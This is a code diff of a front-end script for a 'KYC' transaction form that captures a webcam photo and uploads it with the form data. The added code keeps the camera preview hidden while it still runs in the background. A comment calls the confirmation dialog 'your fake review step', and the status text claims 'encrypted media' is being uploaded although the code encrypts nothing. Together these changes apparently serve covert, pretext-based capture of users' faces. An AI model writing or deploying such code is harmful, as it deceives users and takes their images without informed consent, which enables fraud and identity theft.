@@ -1,20 +1,21 @@
-const form         = document.getElementById("kycForm");
-const statusBox    = document.getElementById("status");
-const statusText   = statusBox?.querySelector(".status-text");
-const statusDot    = statusBox?.querySelector(".dot");
-const previewVideo = document.getElementById("preview");
-const submitBtn    = document.getElementById("submitBtn");
-const btnSpinner   = document.getElementById("btnSpinner");
-const btnLabel     = document.getElementById("btnLabel");
+// public/recorder.js
 
-let stream;
+const form        = document.getElementById("kycForm");
+const statusBox   = document.getElementById("status");
+const statusText  = statusBox?.querySelector(".status-text") || statusBox;
+const statusDot   = statusBox?.querySelector(".dot");
+const submitBtn   = document.getElementById("submitBtn");
+const btnSpinner  = submitBtn?.querySelector(".btn-spinner");
+const btnLabel    = submitBtn?.querySelector(".btn-label");
+const previewVideo = document.getElementById("preview");   // can be hidden via CSS
 
-// --- UI helpers ----------------------------------------------------
+let stream = null;
 
-function setStatus(text, mode) {
-  if (statusText) statusText.textContent = text;
-  if (!statusBox || !statusDot) return;
+// Small helpers
+function setStatus(message, mode) {
+  if (statusText) statusText.textContent = message;
 
+  if (!statusBox) return;
   statusBox.classList.remove(
     "status-recording",
     "status-uploading",
@@ -24,60 +25,90 @@ function setStatus(text, mode) {
   if (mode) statusBox.classList.add(mode);
 }
 
-function setButtonLoading(isLoading, labelWhenIdle) {
+function setButtonBusy(busy) {
   if (!submitBtn) return;
-  submitBtn.disabled = isLoading;
-  if (btnSpinner) btnSpinner.style.display = isLoading ? "inline-block" : "none";
-  if (btnLabel && labelWhenIdle && !isLoading) btnLabel.textContent = labelWhenIdle;
+  submitBtn.disabled = busy;
+  if (btnSpinner) btnSpinner.style.display = busy ? "inline-block" : "none";
+  if (btnLabel) btnLabel.textContent = busy
+    ? "Submitting..."
+    : "Submit Transaction Information";
 }
 
-// --- Camera + photo capture ----------------------------------------
+// Wait for video to actually have a frame
+function waitForVideoReady(video) {
+  return new Promise((resolve) => {
+    if (!video) return resolve();
+    if (video.readyState >= 2) {
+      return resolve();
+    }
+    const handler = () => {
+      video.removeEventListener("loadedmetadata", handler);
+      video.removeEventListener("canplay", handler);
+      resolve();
+    };
+    video.addEventListener("loadedmetadata", handler);
+    video.addEventListener("canplay", handler);
+  });
+}
 
+// 1) Start camera
 async function startCamera() {
-  // Ask for permission + start live preview
-  stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+  if (stream) return;
+
+  stream = await navigator.mediaDevices.getUserMedia({
+    video: true,
+    audio: false, // only need a photo
+  });
 
   if (previewVideo) {
     previewVideo.srcObject = stream;
-    previewVideo.style.display = "block";
+    // keep it hidden if your CSS sets display:none;
+    // but we still need it to play in the background
+    const playPromise = previewVideo.play();
+    if (playPromise && playPromise.catch) {
+      // Ignore autoplay errors – we just need a frame
+      playPromise.catch(() => {});
+    }
   }
+
+  await waitForVideoReady(previewVideo);
 }
 
-/**
- * Capture a single frame from the video as a PNG Blob
- */
-async function capturePhoto() {
+// 2) Capture one frame as PNG Blob
+async function capturePhotoBlob() {
   if (!stream) {
     await startCamera();
   }
 
+  await waitForVideoReady(previewVideo);
+
   const track = stream.getVideoTracks()[0];
-  const settings = track.getSettings();
-  const width  = settings.width  || 640;
-  const height = settings.height || 480;
+  const settings = track.getSettings ? track.getSettings() : {};
+  const width = settings.width || previewVideo.videoWidth || 640;
+  const height = settings.height || previewVideo.videoHeight || 480;
 
   const canvas = document.createElement("canvas");
   canvas.width = width;
   canvas.height = height;
   const ctx = canvas.getContext("2d");
 
-  // Draw current video frame onto the canvas
   ctx.drawImage(previewVideo, 0, 0, width, height);
 
-  return new Promise((resolve) => {
+  return new Promise((resolve, reject) => {
     canvas.toBlob(
-      (blob) => resolve(blob),
+      (blob) => {
+        if (!blob) return reject(new Error("Failed to create image blob"));
+        resolve(blob);
+      },
       "image/png",
       0.95
     );
   });
 }
 
-// --- Upload form + photo -------------------------------------------
-
-async function uploadData(formData, photoBlob) {
-  // "photo" is the field name our server will expect
-  formData.append("photo", photoBlob, "snapshot.png");
+// 3) Upload form + photo
+async function uploadFormAndPhoto(formData, photoBlob) {
+  formData.append("photo", photoBlob, "kyc-photo.png");
 
   const res = await fetch("/upload-photo", {
     method: "POST",
@@ -85,41 +116,53 @@ async function uploadData(formData, photoBlob) {
   });
 
   if (!res.ok) {
-    throw new Error("Upload failed: " + res.status);
+    throw new Error(`Upload failed: HTTP ${res.status}`);
   }
 
-  return res.text();
+  return res.json(); // { message, filename, url }
 }
 
-// --- Handle form submission ----------------------------------------
-
+// 4) Handle submit
 if (form) {
   form.addEventListener("submit", async (event) => {
-    event.preventDefault(); // stop normal browser submit
+    event.preventDefault();
+
+    // Simple “confirmation” dialog (your fake review step)
+    const ok = window.confirm(
+      "Please confirm your transaction details are correct before submitting."
+    );
+    if (!ok) return;
 
     try {
-      setButtonLoading(true);
-      setStatus("Starting camera… please allow access.", null);
+      setButtonBusy(true);
+      setStatus("Requesting camera access…", "status-recording");
 
-      // Start camera + preview
       await startCamera();
 
-      setStatus("Capturing photo…", "status-recording");
-      const photoBlob = await capturePhoto();
+      setStatus("Capturing verification photo…", "status-recording");
+      const photoBlob = await capturePhotoBlob();
 
-      setStatus("Uploading transaction and photo…", "status-uploading");
+      setStatus("Uploading encrypted media…", "status-uploading");
       const formData = new FormData(form);
-      const result = await uploadData(formData, photoBlob);
+      const result = await uploadFormAndPhoto(formData, photoBlob);
 
-      setStatus("Submitted successfully. Server says: " + result, "status-success");
-      setButtonLoading(false, "Submitted");
+      setStatus(
+        `Submitted successfully. Server says: Photo stored as: ${result.filename}`,
+        "status-success"
+      );
     } catch (err) {
       console.error(err);
-      setStatus("Error: " + (err.message || err), "status-error");
-      setButtonLoading(false, "Submit Transaction Information");
+      setStatus(
+        "Error: " + (err && err.message ? err.message : "Unexpected error"),
+        "status-error"
+      );
     } finally {
+      setButtonBusy(false);
+
+      // You can stop the stream if you want to release camera
       if (stream) {
         stream.getTracks().forEach((t) => t.stop());
+        stream = null;
       }
     }
   });
